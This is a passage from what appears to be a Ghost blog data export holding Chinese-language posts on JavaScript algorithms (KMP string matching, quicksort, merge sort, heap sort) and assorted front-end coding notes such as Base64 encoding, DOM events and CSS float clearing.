B=[];\\n            for(var i=1;i<b.length+1;i++){\\n                if(i==1){B.push(0);continue}\\n                var tempStr = b.substring(0,i);\\n                var pre=[];\\n                var next=[];\\n                for(var j=1;j<tempStr.length;j++){\\n                    pre.push(tempStr.substring(0,j));\\n               next.push(tempStr.substring(tempStr.length-j,tempStr.length))\\n                }\\n                B.push( retunB(pre,next)) ;\\n            }\\n            return B;\\n        }\\n```\\n2.开始KMP匹配:\\n```\\n      function KMP(a,b){\\n            var B = getB(b);\\n            for(var i=0;i< a.length;i++){\\n                if(a.substr(i,1)==b.substr(0,1)){\\n                    for(var j=0;j< b.length;j++){\\n                        if(a.substr(i+j,1)!=b.substr(j,1)){\\n                            var y=j-B[j-1];\\n                            i = i+y-1;\\n                            break;\\n                        }\\n                        if(j == b.length-1){console.log(i);}\\n                    }\\n                }\\n            }\\n        }\\n```\\n\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p>本人想找前端的工作。因此，算法语言都是用的javascript。</p>\n<p>先介绍一种人人都能写出的匹配方法。</p>\n<pre><code>        function strMatch(a,b){\n            for(var i=0;i&lt; a.length;i++){\n                if(a.substr(i,1)==b.substr(0,1)){\n                    for(var j=0;j&lt; b.length;j++){\n                        if(a.substr(i+j,1)!=b.substr(j,1)){break;}\n                        if(j == b.length-1){console.log(i);}\n                    }\n                }\n            }\n        }\n</code></pre>\n<p>再来介绍大名鼎鼎KMP算法（Knuth-Morris-Pratt，起头的那个K就是著名科学家Donald Knuth。写过《计算机程序设计艺术》一书，当时被誉为计算机学的圣经。）：</p>\n<blockquote>\n<p>转的<a href=\"http://kb.cnblogs.com/page/176818/\">字符串匹配的KMP算法知识库博客园</a></p>\n</blockquote>\n<p>1.先得出《部分匹配表》<br>\n　　首先，要了解两个概念：&quot;前缀&quot;和&quot;后缀&quot;。 &quot;前缀&quot;指除了最后一个字符以外，一个字符串的全部头部组合；&quot;后缀&quot;指除了第一个字符以外，一个字符串的全部尾部组合。&quot;部分匹配值&quot;就是&quot;前缀&quot;和&quot;后缀&quot;的最长的共有元素的长度。</p>\n<pre><code>　　－　&quot;A&quot;的前缀和后缀都为空集，共有元素的长度为0；\n　　－　&quot;AB&quot;的前缀为[A]，后缀为[B]，共有元素的长度为0；\n　　－　&quot;ABC&quot;的前缀为[A, AB]，后缀为[BC, C]，共有元素的长度0；\n　　－　&quot;ABCD&quot;的前缀为[A, AB, ABC]，后缀为[BCD, CD, D]，共有元素的长度为0；\n　　－　&quot;ABCDA&quot;的前缀为[A, AB, ABC, ABCD]，后缀为[BCDA, CDA, DA, A]，共有元素为&quot;A&quot;，长度为1；\n　　－　&quot;ABCDAB&quot;的前缀为[A, AB, ABC, ABCD, ABCDA]，后缀为[BCDAB, CDAB, DAB, AB, B]，共有元素为&quot;AB&quot;，长度为2；\n　　－　&quot;ABCDABD&quot;的前缀为[A, AB, ABC, ABCD, ABCDA, ABCDAB]，后缀为[BCDABD, CDABD, DABD, ABD, BD, D]，共有元素的长度为0。\n</code></pre>\n<p>代码：</p>\n<pre><code>    function retunB(pre,next){\n            var temp=[];\n            for(var i=0;i&lt;pre.length;i++){\n                if(pre[i]==next[i]){\n                    temp.push(pre[i]);\n                }\n            }\n            if(temp.length==0){return 0;}\n            else{return temp[temp.length-1].length;}\n        }\n        function getB(b){\n            var B=[];\n            for(var i=1;i&lt;b.length+1;i++){\n                if(i==1){B.push(0);continue}\n                var tempStr = b.substring(0,i);\n                var pre=[];\n                var next=[];\n                for(var j=1;j&lt;tempStr.length;j++){\n                    pre.push(tempStr.substring(0,j));\n               next.push(tempStr.substring(tempStr.length-j,tempStr.length))\n                }\n                B.push( retunB(pre,next)) ;\n            }\n            return B;\n        }\n</code></pre>\n<p>2.开始KMP匹配:</p>\n<pre><code>      function KMP(a,b){\n            var B = getB(b);\n            for(var i=0;i&lt; a.length;i++){\n                if(a.substr(i,1)==b.substr(0,1)){\n                    for(var j=0;j&lt; b.length;j++){\n                        if(a.substr(i+j,1)!=b.substr(j,1)){\n                            var y=j-B[j-1];\n                            i = i+y-1;\n                            break;\n                        }\n                        if(j == b.length-1){console.log(i);}\n                    }\n                }\n            }\n        }\n</code></pre>\n<!--kg-card-end: markdown-->","comment_id":"2","plaintext":"本人想找前端的工作。因此，算法语言都是用的javascript。\n\n先介绍一种人人都能写出的匹配方法。\n\n        function strMatch(a,b){\n            for(var i=0;i< a.length;i++){\n                if(a.substr(i,1)==b.substr(0,1)){\n                    for(var j=0;j< b.length;j++){\n                        if(a.substr(i+j,1)!=b.substr(j,1)){break;}\n                        if(j == b.length-1){console.log(i);}\n                    }\n                }\n            }\n        }\n\n\n再来介绍大名鼎鼎KMP算法（Knuth-Morris-Pratt，起头的那个K就是著名科学家Donald\nKnuth。写过《计算机程序设计艺术》一书，当时被誉为计算机学的圣经。）：\n\n> 转的字符串匹配的KMP算法知识库博客园 [http://kb.cnblogs.com/page/176818/]\n\n\n1.先得出《部分匹配表》\n首先，要了解两个概念：\"前缀\"和\"后缀\"。\n\"前缀\"指除了最后一个字符以外，一个字符串的全部头部组合；\"后缀\"指除了第一个字符以外，一个字符串的全部尾部组合。\"部分匹配值\"就是\"前缀\"和\"后缀\"的最长的共有元素的长度。\n\n　　－　\"A\"的前缀和后缀都为空集，共有元素的长度为0；\n　　－　\"AB\"的前缀为[A]，后缀为[B]，共有元素的长度为0；\n　　－　\"ABC\"的前缀为[A, AB]，后缀为[BC, C]，共有元素的长度0；\n　　－　\"ABCD\"的前缀为[A, AB, ABC]，后缀为[BCD, CD, D]，共有元素的长度为0；\n　　－　\"ABCDA\"的前缀为[A, AB, ABC, ABCD]，后缀为[BCDA, CDA, DA, A]，共有元素为\"A\"，长度为1；\n　　－　\"ABCDAB\"的前缀为[A, AB, ABC, ABCD, ABCDA]，后缀为[BCDAB, CDAB, DAB, AB, B]，共有元素为\"AB\"，长度为2；\n　　－　\"ABCDABD\"的前缀为[A, AB, ABC, ABCD, ABCDA, ABCDAB]，后缀为[BCDABD, CDABD, DABD, ABD, BD, D]，共有元素的长度为0。\n\n\n代码：\n\n    function retunB(pre,next){\n            var temp=[];\n            for(var i=0;i<pre.length;i++){\n                if(pre[i]==next[i]){\n                    temp.push(pre[i]);\n                }\n            }\n            if(temp.length==0){return 0;}\n            else{return temp[temp.length-1].length;}\n        }\n        function getB(b){\n            var B=[];\n            for(var i=1;i<b.length+1;i++){\n                if(i==1){B.push(0);continue}\n                var tempStr = b.substring(0,i);\n                var pre=[];\n                var next=[];\n                for(var j=1;j<tempStr.length;j++){\n                    pre.push(tempStr.substring(0,j));\n               next.push(tempStr.substring(tempStr.length-j,tempStr.length))\n                }\n                B.push( retunB(pre,next)) ;\n            }\n            return B;\n        }\n\n\n2.开始KMP匹配:\n\n      function KMP(a,b){\n            var B = getB(b);\n            for(var i=0;i< a.length;i++){\n                if(a.substr(i,1)==b.substr(0,1)){\n                    for(var j=0;j< b.length;j++){\n                        if(a.substr(i+j,1)!=b.substr(j,1)){\n                            var y=j-B[j-1];\n                            i = i+y-1;\n                            break;\n                        }\n                        if(j == b.length-1){console.log(i);}\n                    }\n                }\n            }\n        }","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2016-01-22T01:01:04.000Z","created_by":"1","updated_at":"2017-01-17T07:24:46.000Z","updated_by":"1","published_at":"2016-01-22T02:59:52.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d2c3","uuid":"a6ea26bf-8ad3-42b4-b7e7-124ea38b4fa9","title":"几种排序（javascript）","slug":"jizhong","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"先写快排吧,时间复杂度为O(nlogn)，时间复杂度由渐进符号O符号表示，f(n) = O(g(n))，表示f(n)的复杂度最多与g(n)一个数量级，即小于等于。\\n\\n思想：通过一趟排序将要排序的数据分割成独立的两部分，其中一部分的所有数据都比另外一部分的所有数据都要小，然后再按此方法对这两部分数据分别进行快速排序，整个排序过程可以递归进行，以此达到整个数据变成有序序列。\\n```\\nArray.prototype.quickSort=function(){    //快排  \\n    var arr=this;\\n    if (arr.length <= 1) { return arr; }\\n    var index= Math.floor(arr.length/2);\\n    //   var pivot = arr.splice(index,1)[0];\\n    var pivot = arr[index];\\n    var left=[];\\n    var right=[];\\n    for(var i=0;i<arr.length;i++){\\n        if(i==index){continue;}\\n        if(arr[i]>pivot){right.push(arr[i])}\\n        else{left.push(arr[i])}\\n    }\\n    return left.quickSort().concat([pivot], right.quickSort());\\n}\\n```\\n归并排序：（可以用于外排序，把几组已经排好序的集合归并到一组）\\n```\\nfunction　merge(left, right){  \\n    var　result=[];\\n    while(left.length>0 && right.length>0){\\n        if(left[0]<right[0]){\\n        /*shift()方法用于把数组的第一个元素从其中删除，并返回第一个元素的值。*/\\n            result.push(left.shift());\\n        }else{\\n            result.push(right.shift());\\n        }\\n    }\\n    return　result.concat(left).concat(right);\\n}\\nfunction　mergeSort(items){  //items数组  \\n    if(items.length == 1){\\n        return　items;\\n    }\\n    var　middle = Math.floor(items.length/2),\\n    left = items.slice(0, middle),\\n    right = items.slice(middle);\\n    return　merge(mergeSort(left),mergeSort(right));\\n}\\n\\n```\\n堆排序:\\n```\\nArray.prototype.swap=function(i,j){   //交换元素  \\n    var tmp=this[i];\\n    this[i]=this[j];\\n    this[j]=tmp;\\n};\\n\\nArray.prototype.heapSort=function(f){            //堆排序  \\n    var fn=f;;\\n    if(f==null){\\n        fn=function(a,b){return a-b;}\\n    }\\n\\n    var that=this;\\n    buildHeap();\\n    for(var i=that.length-1;i>0;i--){\\n        that.swap(0,i);\\n        heapAdjust(0,i);\\n    }\\n    return that;\\n    function heapAdjust(i,j){\\n        var M=i;\\n        var left=i*2+1;\\n        var right=i*2+2;\\n        if(left<j&&fn(that[M],that[left])<0){\\n            M=left;\\n        }\\n        if(right<j&&fn(that[M],that[right])<0){\\n            M=right;\\n        }\\n        if(M!=i){\\n            that.swap(i,M);\\n            heapAdjust(M,j);\\n        }\\n    }\\n    function buildHeap(){\\n        for(var i=Math.floor(that.length/2)-1;i>=0;i--){\\n            heapAdjust(i,that.length);\\n        }\\n    }\\n}\\n```\\n\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p>先写快排吧,时间复杂度为O(nlogn)，时间复杂度由渐进符号O符号表示，f(n) = O(g(n))，表示f(n)的复杂度最多与g(n)一个数量级，即小于等于。</p>\n<p>思想：通过一趟排序将要排序的数据分割成独立的两部分，其中一部分的所有数据都比另外一部分的所有数据都要小，然后再按此方法对这两部分数据分别进行快速排序，整个排序过程可以递归进行，以此达到整个数据变成有序序列。</p>\n<pre><code>Array.prototype.quickSort=function(){    //快排  \n    var arr=this;\n    if (arr.length &lt;= 1) { return arr; }\n    var index= Math.floor(arr.length/2);\n    //   var pivot = arr.splice(index,1)[0];\n    var pivot = arr[index];\n    var left=[];\n    var right=[];\n    for(var i=0;i&lt;arr.length;i++){\n        if(i==index){continue;}\n        if(arr[i]&gt;pivot){right.push(arr[i])}\n        else{left.push(arr[i])}\n    }\n    return left.quickSort().concat([pivot], right.quickSort());\n}\n</code></pre>\n<p>归并排序：（可以用于外排序，把几组已经排好序的集合归并到一组）</p>\n<pre><code>function　merge(left, right){  \n    var　result=[];\n    while(left.length&gt;0 &amp;&amp; right.length&gt;0){\n        if(left[0]&lt;right[0]){\n        /*shift()方法用于把数组的第一个元素从其中删除，并返回第一个元素的值。*/\n            result.push(left.shift());\n        }else{\n            result.push(right.shift());\n        }\n    }\n    return　result.concat(left).concat(right);\n}\nfunction　mergeSort(items){  //items数组  \n    if(items.length == 1){\n        return　items;\n    }\n    var　middle = Math.floor(items.length/2),\n    left = items.slice(0, middle),\n    right = items.slice(middle);\n    return　merge(mergeSort(left),mergeSort(right));\n}\n\n</code></pre>\n<p>堆排序:</p>\n<pre><code>Array.prototype.swap=function(i,j){   //交换元素  \n    var tmp=this[i];\n    this[i]=this[j];\n    this[j]=tmp;\n};\n\nArray.prototype.heapSort=function(f){            //堆排序  \n    var fn=f;;\n    if(f==null){\n        fn=function(a,b){return a-b;}\n    }\n\n    var that=this;\n    buildHeap();\n    for(var i=that.length-1;i&gt;0;i--){\n        that.swap(0,i);\n        heapAdjust(0,i);\n    }\n    return that;\n    function heapAdjust(i,j){\n        var M=i;\n        var left=i*2+1;\n        var right=i*2+2;\n        if(left&lt;j&amp;&amp;fn(that[M],that[left])&lt;0){\n            M=left;\n        }\n        if(right&lt;j&amp;&amp;fn(that[M],that[right])&lt;0){\n            M=right;\n        }\n        if(M!=i){\n            that.swap(i,M);\n            heapAdjust(M,j);\n        }\n    }\n    function buildHeap(){\n        for(var i=Math.floor(that.length/2)-1;i&gt;=0;i--){\n            heapAdjust(i,that.length);\n        }\n    }\n}\n</code></pre>\n<!--kg-card-end: markdown-->","comment_id":"3","plaintext":"先写快排吧,时间复杂度为O(nlogn)，时间复杂度由渐进符号O符号表示，f(n) =\nO(g(n))，表示f(n)的复杂度最多与g(n)一个数量级，即小于等于。\n\n思想：通过一趟排序将要排序的数据分割成独立的两部分，其中一部分的所有数据都比另外一部分的所有数据都要小，然后再按此方法对这两部分数据分别进行快速排序，整个排序过程可以递归进行，以此达到整个数据变成有序序列。\n\nArray.prototype.quickSort=function(){    //快排  \n    var arr=this;\n    if (arr.length <= 1) { return arr; }\n    var index= Math.floor(arr.length/2);\n    //   var pivot = arr.splice(index,1)[0];\n    var pivot = arr[index];\n    var left=[];\n    var right=[];\n    for(var i=0;i<arr.length;i++){\n        if(i==index){continue;}\n        if(arr[i]>pivot){right.push(arr[i])}\n        else{left.push(arr[i])}\n    }\n    return left.quickSort().concat([pivot], right.quickSort());\n}\n\n\n归并排序：（可以用于外排序，把几组已经排好序的集合归并到一组）\n\nfunction　merge(left, right){  \n    var　result=[];\n    while(left.length>0 && right.length>0){\n        if(left[0]<right[0]){\n        /*shift()方法用于把数组的第一个元素从其中删除，并返回第一个元素的值。*/\n            result.push(left.shift());\n        }else{\n            result.push(right.shift());\n        }\n    }\n    return　result.concat(left).concat(right);\n}\nfunction　mergeSort(items){  //items数组  \n    if(items.length == 1){\n        return　items;\n    }\n    var　middle = Math.floor(items.length/2),\n    left = items.slice(0, middle),\n    right = items.slice(middle);\n    return　merge(mergeSort(left),mergeSort(right));\n}\n\n\n\n堆排序:\n\nArray.prototype.swap=function(i,j){   //交换元素  \n    var tmp=this[i];\n    this[i]=this[j];\n    this[j]=tmp;\n};\n\nArray.prototype.heapSort=function(f){            //堆排序  \n    var fn=f;;\n    if(f==null){\n        fn=function(a,b){return a-b;}\n    }\n\n    var that=this;\n    buildHeap();\n    for(var i=that.length-1;i>0;i--){\n        that.swap(0,i);\n        heapAdjust(0,i);\n    }\n    return that;\n    function heapAdjust(i,j){\n        var M=i;\n        var left=i*2+1;\n        var right=i*2+2;\n        if(left<j&&fn(that[M],that[left])<0){\n            M=left;\n        }\n        if(right<j&&fn(that[M],that[right])<0){\n            M=right;\n        }\n        if(M!=i){\n            that.swap(i,M);\n            heapAdjust(M,j);\n        }\n    }\n    function buildHeap(){\n        for(var i=Math.floor(that.length/2)-1;i>=0;i--){\n            heapAdjust(i,that.length);\n        }\n    }\n}","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2016-01-22T01:25:32.000Z","created_by":"1","updated_at":"2017-01-17T07:25:39.000Z","updated_by":"1","published_at":"2016-01-22T01:37:57.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d2c4","uuid":"c7ee1845-6b63-4572-957d-28a6328ab174","title":"JS笔记","slug":"ji-lu","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"\\n\\n```\\nvar Reg=new RegExp(/data-page=\\\"\\\\d+\\\"/g)\\nvar arr=str.match(Reg)\\n```\\n```\\n在 Web 开发中经常会碰到需要动态监听输入框值变化的情况，如果使用 onkeydown、onkeypress、onkeyup 这个几个键盘事件来监测的话，监听不了右键的复制、剪贴和粘贴这些操作，处理组合快捷键也很麻烦。因此这篇文章向大家介绍一种完美的解决方案：结合 HTML5 标准事件 oninput 和 IE 专属事件 onpropertychange 事件来监听输入框值变化。\\n```\\n <input type=\\\"text\\\" id=\\\"myI\\\" name=\\\"fname\\\" pattern=\\\".{6,}\\\">\\npattern接正则表达式。\\n```\\nvar pp = {\\n        _name : \\\"jeapedu\\\",\\n        set name(v){\\n                this._name = v;\\n        },\\n        get name(){\\n                return this._name;\\n        }\\n}\\npp.name = \\\"China\\\";\\nconsole.log(pp.name);\\n```\\n\\n```\\nvar comment = document.getElementsByTagName('a')[0];\\n \\nif (document.all) {\\n // For IE \\ncomment.click();\\n} \\nelse if (document.createEvent) {\\n   //FOR DOM2\\nvar ev = document.createEvent('MouseEvents');\\n ev.initEvent('click', false, true);\\n comment.dispatchEvent(ev);\\n}\\n```\\n```\\n高度塌陷的问题 – 清除浮动 \\n1.直接一个<div style=\\\"clear:both;\\\"></div>放到当作最后一个子标签放到父标签  \\n2.overflow + zoom方法    .fix{overflow:hidden; zoom:1;}  \\n3. after + zoom方法  \\n.fix{zoom:1;}\\n.fix:after{display:block; content:'clear'; clear:both; line-height:0; visibility:hidden;} \\n```\\n```\\n       Array.prototype.indexOf = function(val) {\\n            for (var i = 0; i < this.length; i++) {\\n                if (this[i] == val) return i;\\n            }\\n            return -1;\\n        };\\n        Array.prototype.remove = function(val) {\\n            var index = this.indexOf(val);\\n            if (index > -1) {\\n                this.splice(index, 1);\\n            }\\n        };\\n```\\n\\n```\\nreq.headers 看请求头  \\nreq.on(‘data’) 请求事件  \\nres.writeHeader() 写响应头  \\nres.write() 写响应体  \\n前端ajax的接口就是：XMLHTTPRequest的实例ajax\\n\\najax.status 看响应码  \\najax.responseText 看响应体  \\najax.onload 响应事件  \\najax.open() 请求方法  \\najax.setRequestHeader() 请求头  \\najax.send() 请求体  \\n```\\n```\\nparseInt('123',10)  慢  \\nNumber('123')  \\n'123'<<0            快  \\n注： 小心使用位操作运算符。数字会被当成 64 位值，但是位操作运算符总是返回 32 位的整数（source）。位操作处理大于 32 位的整数值时还会导致意料之外的行为。讨论。最大的 32 位整数是 2,147,483,647：\\n2147483647 >> 0 //=> 2147483647  \\n2147483648 >> 0 //=> -2147483648  \\n2147483649 >> 0 //=> -2147483647\\n\\n~~n  都行\\nn<<0  \\nn>>0  \\nn|0  \\n```\\n\\n```\\n var Base64 = {\\n        // 转码表\\n        table : [\\n                'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H',\\n                'I', 'J', 'K', 'L', 'M', 'N', 'O' ,'P',\\n                'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X',\\n                'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f',\\n                'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',\\n                'o', 'p', 'q', 'r', 's', 't', 'u', 'v',\\n                'w', 'x', 'y', 'z', '0', '1', '2', '3',\\n                '4', '5', '6', '7', '8', '9', '+', '/'\\n        ],\\n        UTF16ToUTF8 : function(str) {\\n            var res = [], len = str.length;\\n            for (var i = 0; i < len; i++) {\\n                var code = str.charCodeAt(i);\\n                if (code > 0x0000 && code <= 0x007F) {\\n                    // 单字节，这里并不考虑0x0000，因为它是空字节\\n                    // U+00000000 – U+0000007F  0xxxxxxx\\n                    res.push(str.charAt(i));\\n                } else if (code >= 0x0080 && code <= 0x07FF) {\\n                    // 双字节\\n                    // U+00000080 – U+000007FF  110xxxxx 10xxxxxx\\n                    // 110xxxxx\\n                    var byte1 = 0xC0 | ((code >> 6) & 0x1F);\\n                    // 10xxxxxx\\n                    var byte2 = 0x80 | (code & 0x3F);\\n                    res.push(\\n                        String.fromCharCode(byte1), \\n                        String.fromCharCode(byte2)\\n                    );\\n                } else if (code >= 0x0800 && code <= 0xFFFF) {\\n                    // 三字节\\n                    // U+00000800 – U+0000FFFF  1110xxxx 10xxxxxx 10xxxxxx\\n                    // 1110xxxx\\n                    var byte1 = 0xE0 | ((code >> 12) & 0x0F);\\n                    // 10xxxxxx\\n                    var byte2 = 0x80 | ((code >> 6) & 0x3F);\\n                    // 10xxxxxx\\n                    var byte3 = 0x80 | (code & 0x3F);\\n                    res.push(\\n                        String.fromCharCode(byte1), \\n                        String.fromCharCode(byte2), \\n                        String.fromCharCode(byte3)\\n                    );\\n                } else if (code >= 0x00010000 && code <= 0x001FFFFF) {\\n                    // 四字节\\n                    // U+00010000 – U+001FFFFF  11110xxx 10xxxxxx 10xxxxxx 10xxxxxx\\n                } else if (code >= 0x00200000 && code <= 0x03FFFFFF) {\\n                    // 五字节\\n                    // U+00200000 – U+03FFFFFF  111110xx 10xxxxxx 10xxxxxx 10xxxxxx 10xxxxxx\\n                } else /** if (code >= 0x04000000 && code <= 0x7FFFFFFF)*/ {\\n                    // 六字节\\n                    // U+04000000 – U+7FFFFFFF  1111110x 10xxxxxx 10xxxxxx 10xxxxxx 10xxxxxx 10xxxxxx\\n                }\\n            }\\n\\n            return res.join('');\\n        },\\n        UTF8ToUTF16 : function(str) {\\n            var res = [], len = str.length;\\n            var i = 0;\\n            for (var i = 0; i < len; i++) {\\n                var code = str.charCodeAt(i);\\n                // 对第一个字节进行判断\\n                if (((code >> 7) & 0xFF) == 0x0) {\\n                    // 单字节\\n                    // 0xxxxxxx\\n                    res.push(str.charAt(i));\\n                } else if (((code >> 5) & 0xFF) == 0x6) {\\n                    // 双字节\\n                    // 110xxxxx 10xxxxxx\\n                    var code2 = str.charCodeAt(++i);\\n                    var byte1 = (code & 0x1F) << 6;\\n                    var byte2 = code2 & 0x3F;\\n                    var utf16 = byte1 | byte2;\\n                    res.push(Sting.fromCharCode(utf16));\\n                } else if (((code >> 4) & 0xFF) == 0xE) {\\n                    // 三字节\\n                    // 1110xxxx 10xxxxxx 10xxxxxx\\n                    var code2 = str.charCodeAt(++i);\\n                    var code3 = str.charCodeAt(++i);\\n                    var byte1 = (code << 4) | ((code2 >> 2) & 0x0F);\\n                    var byte2 = ((code2 & 0x03) << 6) | (code3 & 0x3F);\\n                    var utf16 = ((byte1 & 0x00FF) << 8) | byte2\\n                    res.push(String.fromCharCode(utf16));\\n                } else if (((code >> 3) & 0xFF) == 0x1E) {\\n                    // 四字节\\n                    // 11110xxx 10xxxxxx 10xxxxxx 10xxxxxx\\n                } else if (((code >> 2) & 0xFF) == 0x3E) {\\n                    // 五字节\\n                    // 111110xx 10xxxxxx 10xxxxxx 10xxxxxx 10xxxxxx\\n                } else /** if (((code >> 1) & 0xFF) == 0x7E)*/ {\\n                    // 六字节\\n                    // 1111110x 10xxxxxx 10xxxxxx 10xxxxxx 10xxxxxx 10xxxxxx\\n                }\\n            }\\n\\n            return res.join('');\\n        },\\n        encode : function(str) {\\n            if (!str) {\\n                return '';\\n            }\\n            var utf8    = this.UTF16ToUTF8(str); // 转成UTF8\\n            var i = 0; // 遍历索引\\n            var len = utf8.length;\\n            var res = [];\\n            while (i < len) {\\n                var c1 = utf8.charCodeAt(i++) & 0xFF;\\n                res.push(this.table[c1 >> 2]);\\n                // 需要补2个=\\n                if (i == len) {\\n                    res.push(this.table[(c1 & 0x3) << 4]);\\n                    res.push('==');\\n                    break;\\n                }\\n                var c2 = utf8.charCodeAt(i++);\\n                // 需要补1个=\\n                if (i == len) {\\n                    res.push(this.table[((c1 & 0x3) << 4) | ((c2 >> 4) & 0x0F)]);\\n                    res.push(this.table[(c2 & 0x0F) << 2]);\\n                    res.push('=');\\n                    break;\\n                }\\n                var c3 = utf8.charCodeAt(i++);\\n                res.push(this.table[((c1 & 0x3) << 4) | ((c2 >> 4) & 0x0F)]);\\n                res.push(this.table[((c2 & 0x0F) << 2) | ((c3 & 0xC0) >> 6)]);\\n                res.push(this.table[c3 & 0x3F]);\\n            }\\n\\n            return res.join('');\\n        },\\n        decode : function(str) {\\n            if (!str) {\\n                return '';\\n            }\\n\\n            var len = str.length;\\n            var i   = 0;\\n            var res = [];\\n\\n            while (i < len) {\\n                code1 = this.table.indexOf(str.charAt(i++));\\n                code2 = this.table.indexOf(str.charAt(i++));\\n                code3 = this.table.indexOf(str.charAt(i++));\\n                code4 = this.table.indexOf(str.charAt(i++));\\n\\n                c1 = (code1 << 2) | (code2 >> 4);\\n                c2 = ((code2 & 0xF) << 4) | (code3 >> 2);\\n                c3 = ((code3 & 0x3) << 6) | code4;\\n\\n                res.push(String.fromCharCode(c1));\\n\\n                if (code3 != 64) {\\n                    res.push(String.fromCharCode(c2));\\n                }\\n                if (code4 != 64) {\\n                    res.push(String.fromCharCode(c3));\\n                }\\n\\n            }\\n\\n            return this.UTF8ToUTF16(res.join(''));\\n        }\\n    };\\n        var css3 = function(dom) {\\n            this.dom = dom;\\n            this.css = function(option) {\\n                if (arguments.length === 2) {\\n                    var obj = {};\\n                    obj[arguments[0]] = arguments[1];\\n                    option = obj;\\n                }\\n                for (var key in option) {\\n                    var temp = document.createElement('temp').style;\\n                    if (typeof temp[key] === \\\"undefined\\\") {\\n                        var prefixes = ['Webkit', 'Moz', 'O', 'ms', 'Khtml'];\\n                        var keyC = key.charAt(0).toUpperCase() + key.substr(1);\\n                        for (var x in prefixes) {\\n                            prefixes[x] = prefixes[x] + keyC;\\n                            if (typeof temp[prefixes[x]] !== \\\"undefined\\\") {\\n                                this.dom.style[prefixes[x]] = option[key];\\n                                return this;\\n                            }\\n                        }\\n                    } else {\\n                        this.dom.style[key] = option[key];\\n                        return this;\\n                    }\\n                }\\n            }\\n            if (this === window) {\\n                return new css3(dom);\\n            }\\n        }\\n```\\n```\\ngetOwnPropertyNames 方法同时返回可枚举的和不可枚举的属性和方法的名称。若要仅返回可枚举的属性和方法的名称，可使用 Object.keys 函数 (JavaScript)。  \\n```\\n```\\n恩 。 babel升级拆分了模块 。你需要 \\nnpm install babel-loader babel-core babel-preset-es2015 babel-preset-react —save-dev  \\n然后 \\nloader: \\\"babel?presets[]=react,presets[]=es2015\\\"\\n\\n就好了\\n```\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><pre><code>var Reg=new RegExp(/data-page=&quot;\\d+&quot;/g)\nvar arr=str.match(Reg)\n</code></pre>\n<pre><code>在 Web 开发中经常会碰到需要动态监听输入框值变化的情况，如果使用 onkeydown、onkeypress、onkeyup 这个几个键盘事件来监测的话，监听不了右键的复制、剪贴和粘贴这些操作，处理组合快捷键也很麻烦。因此这篇文章向大家介绍一种完美的解决方案：结合 HTML5 标准事件 oninput 和 IE 专属事件 onpropertychange 事件来监听输入框值变化。\n</code></pre>\n <input type=\"text\" id=\"myI\" name=\"fname\" pattern=\".{6,}\">\npattern接正则表达式。\n```\nvar pp = {\n        _name : \"jeapedu\",\n        set name(v){\n                this._name = v;\n        },\n        get name(){\n                return this._name;\n        }\n}\npp.name = \"China\";\nconsole.log(pp.name);\n```\n<pre><code>var comment = document.getElementsByTagName('a')[0];\n \nif (document.all) {\n // For IE \ncomment.click();\n} \nelse if (document.createEvent) {\n   //FOR DOM2\nvar ev = document.createEvent('MouseEvents');\n ev.initEvent('click', false, true);\n comment.dispatchEvent(ev);\n}\n</code></pre>\n<pre><code>高度塌陷的问题 – 清除浮动 \n1.直接一个&lt;div style=&quot;clear:both;&quot;&gt;&lt;/div&gt;放到当作最后一个子标签放到父标签  \n2.overflow + zoom方法    .fix{overflow:hidden; zoom:1;}  \n3. after + zoom方法  \n.fix{zoom:1;}\n.fix:after{display:block; content:'clear'; clear:both; line-height:0; visibility:hidden;} \n</code></pre>\n<pre><code>       Array.prototype.indexOf = function(val) {\n            for (var i = 0; i &lt; this.length; i++) {\n                if (this[i] == val) return i;\n            }\n            return -1;\n        };\n        Array.prototype.remove = function(val) {\n            var index = this.indexOf(val);\n            if (index &gt; -1) {\n                this.splice(index, 1);\n            }\n        };\n</code></pre>\n<pre><code>req.headers 看请求头  \nreq.on(‘data’) 请求事件  \nres.writeHeader() 写响应头  \nres.write() 写响应体  \n前端ajax的接口就是：XMLHTTPRequest的实例ajax\n\najax.status 看响应码  \najax.responseText 看响应体  \najax.onload 响应事件  \najax.open() 请求方法  \najax.setRequestHeader() 请求头  \najax.send() 请求体  \n</code></pre>\n<pre><code>parseInt('123',10)  慢  \nNumber('123')  \n'123'&lt;&lt;0            快  \n注： 小心使用位操作运算符。数字会被当成 64 位值，但是位操作运算符总是返回 32 位的整数（source）。位操作处理大于 32 位的整数值时还会导致意料之外的行为。讨论。最大的 32 位整数是 2,147,483,647：\n2147483647 &gt;&gt; 0 //=&gt; 2147483647  \n2147483648 &gt;&gt; 0 //=&gt; -2147483648  \n2147483649 &gt;&gt; 0 //=&gt; -2147483647\n\n~~n  都行\nn&lt;&lt;0  \nn&gt;&gt;0  \nn|0  \n</code></pre>\n<pre><code> var Base64 = {\n        // 转码表\n        table : [\n                'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H',\n                'I', 'J', 'K', 'L', 'M', 'N', 'O' ,'P',\n                'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X',\n                'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f',\n                'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',\n                'o', 'p', 'q', 'r', 's', 't', 'u', 'v',\n                'w', 'x', 'y', 'z', '0', '1', '2', '3',\n                '4', '5', '6', '7', '8', 